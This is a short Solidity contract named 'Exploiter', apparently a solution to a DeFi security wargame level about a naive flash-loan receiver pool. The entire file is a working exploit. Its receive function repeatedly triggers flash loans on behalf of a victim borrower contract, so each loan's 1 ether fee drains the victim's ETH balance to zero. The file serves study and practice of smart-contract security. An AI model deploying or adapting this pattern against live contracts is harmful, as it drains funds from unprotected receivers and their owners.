
pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";
contract Exploiter is IERC3156FlashBorrower {
  IERC3156FlashLender lender;
  IERC3156FlashBorrower borrower;

  constructor(IERC3156FlashLender _lender, IERC3156FlashBorrower _borrower) {
    lender = _lender;
    borrower = _borrower;
  }

  receive () payable external {
    uint borrowerBalance = address(borrower).balance;

    while (borrowerBalance > 0) {
      lender.flashLoan(borrower, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 1 ether, "0x");
      borrowerBalance = address(borrower).balance;
    }
  }

  function onFlashLoan(address, address, uint256, uint256, bytes calldata) external override returns (bytes32) {
    SafeTransferLib.safeTransferETH(address(lender), 1 ether);

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
  }
}